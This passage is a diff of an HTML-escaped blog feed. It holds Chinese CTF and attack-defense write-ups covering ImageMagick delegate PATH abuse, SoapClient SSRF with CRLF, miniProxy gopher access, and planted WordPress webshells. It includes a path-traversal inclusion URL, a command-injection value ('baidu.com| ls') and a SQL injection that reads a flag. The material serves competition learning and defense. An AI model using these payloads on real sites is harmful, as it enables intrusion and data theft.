 &lt;/div>
 &lt;/div>&lt;p>这里参考了其他师傅的 wp ，主要是利用了&lt;code>@BPGDecodeDelegate&lt;/code>对于后缀&lt;code>.bpg&lt;/code>的解析，它会去 PATH 中寻找相关的&lt;code>bpgenc&lt;/code>文件&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009100.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009100.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009100.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们只需要设置一个恶意的 PATH ，并在这个文件夹下放入我们的可执行文件。&lt;/p>
 &lt;p>只要找到函数要执行的文件我们就可以进行操作了。例如下面用了&lt;code>Imagick-&amp;gt;readImage()&lt;/code>的方法&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610002391.jpg&lt;img src="https://blogpic.zdy.one/img/20190610002391.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002391.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h1 id="conclusion">Conclusion
@@ -19383,7 +19377,7 @@ loading="lazy"
 &lt;p>可以参考&lt;a class="link" href="https://www.freebuf.com/articles/web/149761.html" target="_blank" rel="noopener"
 >Nginx不安全配置可能导致的安全漏洞&lt;/a>与&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener"
 >三个案例看Nginx配置安全&lt;/a>&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008852.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008852.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008852.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>下载得到源码&lt;/p>
@@ -19511,7 +19505,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>当我们直接运行这段代码的时候，就因为调用了一个&lt;code>SoapClient&lt;/code>不存在的方法&lt;code>hack()&lt;/code>导致直接调用了&lt;code>__call()&lt;/code>魔术方法&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005272.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005272.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005272.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>详细可以参考&lt;a class="link" href="https://xz.aliyun.com/t/2148" target="_blank" rel="noopener"
@@ -19803,11 +19797,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>利用反序列化的特点，我们可以直接定义私有变量的值，但是字符串中会有不可见字符，实验如下&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005682.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005682.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005682.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们需要用&lt;code>base64_encode&lt;/code>进行编码，把编码得到的字符串再在 burp 里面进行解码构造请求。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008851.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008851.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008851.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="soapclient-ssrf">SoapClient SSRF
@@ -19860,7 +19854,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>当我们请求 8080 的时候，请求的是 miniProxy，但是只能用 GET 请求，而我们之前可以发现&lt;code>SoapClient&lt;/code>只能发 POST 请求&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005778.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005778.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005778.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里大概思路也比较清晰了，就是利用 miniProxy 使用 gopher 协议去访问 mssql 数据库拿到 flag ，但是怎么处理让&lt;code>SoapClient&lt;/code>发送 GET 请求呢？&lt;/p>
@@ -19873,12 +19867,12 @@ loading="lazy"
 &lt;p>The &lt;em>user_agent&lt;/em> option specifies string to use in &lt;em>User-Agent&lt;/em> header.&lt;/p>
 &lt;/blockquote>
 &lt;p>而且在 header 里 &lt;code>User-Agent&lt;/code> 在 &lt;code>Content-Type&lt;/code> 前面，这里我们可以使用 CRLF 进行分隔请求，构造 GET 请求。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005475.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005475.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005475.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="miniproxy-url-scheme-bypass">miniProxy URL scheme bypass
 &lt;/h4>&lt;p>我们自己本地看看 MiniProxy 怎么用。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610003617.jpg&lt;img src="https://blogpic.zdy.one/img/20190610003617.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003617.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>随便测一个&lt;code>file:///etc/passwd&lt;/code>，返回&lt;/p>
@@ -20073,7 +20067,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">insert into posts (userid, title, content, attachment) values ({}, &amp;#34;foobar&amp;#34;, (select flag from flag.flag), &amp;#34;foobar&amp;#34;);
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610007735.jpg&lt;img src="https://blogpic.zdy.one/img/20190610007735.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007735.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="conclusion">Conclusion
@@ -20817,13 +20811,13 @@ loading="lazy"
 &lt;p>以往的攻防比赛，选手对自己&lt;code>web&lt;/code>目录有读写的权力，这样造成了比赛中非常多的选手通过上通防，抓流量记录日志等技巧方式来防守或是攻击得分，并且很多选手通常通过一些“技巧”，通过对比赛&lt;code>check&lt;/code>的绕过，关闭一些关键的正常服务或者全部&lt;code>web&lt;/code>站点服务来在比赛中“苟”住。这样往往导致了很多AWD比赛中&lt;code>web&lt;/code>要么就是被打穿，要么就是“天衣无缝”的情况，&lt;code>web&lt;/code>选手的游戏体验在近期攻防比赛中每况愈下，以网鼎杯&lt;code>web&lt;/code>为例，半决赛跟决赛的&lt;code>check&lt;/code>只检查了&lt;code>index&lt;/code>主页的关键字，导致了很多队伍一开始就进行了删站，只留个&lt;code>index&lt;/code>主页来通过&lt;code>check&lt;/code>，严重破坏了比赛体验。&lt;/p>
 &lt;h3 id="改善">改善？
 &lt;/h3>&lt;p>简而言之就是，本次比赛在理想规则（为啥是理想规则？因为计划与现实完全是理想图与实物图的对比）改变了传统的&lt;code>web&lt;/code>类型的攻防模式，&lt;code>web&lt;/code>目录只读不可写，通过改变&lt;code>waf&lt;/code>正则防御规则来防御攻击，攻击点全靠代码审计来攻击；&lt;code>pwn&lt;/code>类型的与传统攻防相同。（以下三张图片来源于&lt;code>卧龙草堂&lt;/code>公众号）&lt;/p>
-&lt;p>Permalink before if: https://ws1.sinaimg.cn/large/64ef14dcgy1fxuvijd2c0g20pn06c1kx.gif&lt;img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fxuvijd2c0g20pn06c1kx.gif"
+&lt;p>&lt;img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fxuvijd2c0g20pn06c1kx.gif"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://ws1.sinaimg.cn/large/64ef14dcgy1fxuvihrqiug20vz09kkjl.gif&lt;img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fxuvihrqiug20vz09kkjl.gif"
+&lt;p>&lt;img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fxuvihrqiug20vz09kkjl.gif"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://ws1.sinaimg.cn/large/64ef14dcgy1fxuuxv8ggkg20m20hwe81.gif&lt;img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fxuuxv8ggkg20m20hwe81.gif"
+&lt;p>&lt;img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fxuuxv8ggkg20m20hwe81.gif"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="现实赛前">现实：赛前
@@ -20867,7 +20861,7 @@ loading="lazy"
 &lt;h1 id="dayn">Day N
 &lt;/h1>&lt;p>&lt;code>wordpress&lt;/code>版本是最新的&lt;code>4.9.8&lt;/code>，服务器&lt;code>IIS&lt;/code>，不过服务器版本号忘了。&lt;/p>
 &lt;p>对比之后差异一目了然&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009721.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009721.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009721.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>主要是两个一句话木马，以及4个插件。&lt;/p>
@@ -20902,7 +20896,7 @@ loading="lazy"
 &lt;/div>&lt;p>后来搜了一下发现竟然是&lt;code>php&lt;/code>版本过高的问题，因为在&lt;code>php7&lt;/code>中动态调用一些函数是被禁止的。详细参考&lt;a class="link" href="http://shuiboye.blogspot.com/2018/01/php200.html" target="_blank" rel="noopener"
 >菜刀连接php一句话木马返回200的原因及解决方法&lt;/a>&lt;/p>
 &lt;p>这里是个密码为-7的一句话。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610002229.jpg&lt;img src="https://blogpic.zdy.one/img/20190610002229.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002229.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="poc2">Poc 2
@@ -20945,7 +20939,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里就非常清楚了，是个密码为&lt;code>cmd&lt;/code>的一句话。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610006974.jpg&lt;img src="https://blogpic.zdy.one/img/20190610006974.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006974.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="plugin">Plugin
@@ -20960,7 +20954,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;h3 id="site-editor">site-editor
 &lt;/h3>&lt;p>首先看&lt;code>site-editor&lt;/code>&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004098.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004098.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004098.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以从图中看出，主要是个文件包含的漏洞。&lt;/p>
@@ -21003,22 +20997,22 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/wordpress-awd/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=..././..././..././..././..././..././..././wp-includes/pomo/tp.php
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009104.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009104.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009104.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="gift-voucher">gift-voucher
 &lt;/h3>&lt;p>另一个&lt;code>wpscan&lt;/code>扫到的插件是&lt;code>gift-voucher&lt;/code>&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610006248.jpg&lt;img src="https://blogpic.zdy.one/img/20190610006248.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006248.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到这是个盲注的洞，详细参考&lt;a class="link" href="https://www.exploit-db.com/exploits/45255" target="_blank" rel="noopener"
 >WordPress Plugin Gift Voucher 1.0.5 - (Authenticated) &amp;rsquo;template_id&amp;rsquo; SQL Injection&lt;/a>&lt;/p>
 &lt;p>用&lt;code>sqlmap&lt;/code>扫了一下&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610003081.jpg&lt;img src="https://blogpic.zdy.one/img/20190610003081.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003081.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到&lt;code>admin&lt;/code>的密码，如果字典好的话，可以快一些。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005025.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005025.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005025.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="localize-my-post">Localize My Post
@@ -21371,13 +21365,13 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ip=baidu.com%7C%20ls&amp;amp;lookup
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009426.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009426.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009426.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到执行结果。&lt;/p>
 &lt;h2 id="functionphp">Function.php
 &lt;/h2>&lt;p>回过头来，我们再看看还有没有跟官方文件其他不同的文件。除了MAC产生的&lt;code>.DS_Store&lt;/code>文件、&lt;code>._wp-config.php&lt;/code>编辑临时文件、&lt;code>wp-config.php&lt;/code>配置文件，剩下的就是&lt;code>function.php&lt;/code>了&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009721.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009721.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009721.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们对比得到比赛多出了这么一处代码:&lt;/p>
@@ -21432,30 +21426,30 @@ loading="lazy"
 &lt;h2 id="数据">数据
 &lt;/h2>&lt;p>本次比赛由于最后放的调查问卷，而且收集到的调查问卷远远达到签到题得分人数，姑且用来做个大概的分析吧。&lt;/p>
 &lt;p>首先是本次参赛人数，注册人数达到了463个队，最后调查问卷填写人数为81个队。
-Permalink before if: https://s1.ax1x.com/2018/11/17/izikeH.md.png&lt;img src="https://s1.ax1x.com/2018/11/17/izikeH.md.png"
+&lt;img src="https://s1.ax1x.com/2018/11/17/izikeH.md.png"
 loading="lazy"
 alt="izikeH.md.png"
 >
 五个学校的学校数据就不分析了，其中其他学校占到了242个队，基本变成了半公开赛&amp;hellip;但是由于还是想保护萌新，就没有变成完全的公开赛。否则我担心会被日穿&amp;hellip;&lt;/p>
 &lt;p>第一天开赛的情况，由于docker环境没配置好，导致有一题&lt;code>pwn&lt;/code>直接被打穿了，还被改了&lt;code>flag&lt;/code>，大师傅们真的tql&amp;hellip;&lt;/p>
 &lt;p>年级所占比例:
-Permalink before if: https://s1.ax1x.com/2018/11/17/izPzJx.md.png&lt;img src="https://s1.ax1x.com/2018/11/17/izPzJx.md.png"
+&lt;img src="https://s1.ax1x.com/2018/11/17/izPzJx.md.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>比赛难度调查统计：
-Permalink before if: https://s1.ax1x.com/2018/11/17/iziPyD.md.png&lt;img src="https://s1.ax1x.com/2018/11/17/iziPyD.md.png"
+&lt;img src="https://s1.ax1x.com/2018/11/17/iziPyD.md.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>时间安排调查统计：
-Permalink before if: https://s1.ax1x.com/2018/11/17/izi9SK.md.png&lt;img src="https://s1.ax1x.com/2018/11/17/izi9SK.md.png"
+&lt;img src="https://s1.ax1x.com/2018/11/17/izi9SK.md.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>比赛题目调查统计：
-Permalink before if: https://s1.ax1x.com/2018/11/17/iziSW6.md.png&lt;img src="https://s1.ax1x.com/2018/11/17/iziSW6.md.png"
+&lt;img src="https://s1.ax1x.com/2018/11/17/iziSW6.md.png"
 loading="lazy"
 >
 比赛评分调查统计(满分5分)：
-Permalink before if: https://s1.ax1x.com/2018/11/17/iziiOe.md.png&lt;img src="https://s1.ax1x.com/2018/11/17/iziiOe.md.png"
+&lt;img src="https://s1.ax1x.com/2018/11/17/iziiOe.md.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>以上数据均由比赛调查问卷数据统计得出。&lt;/p>
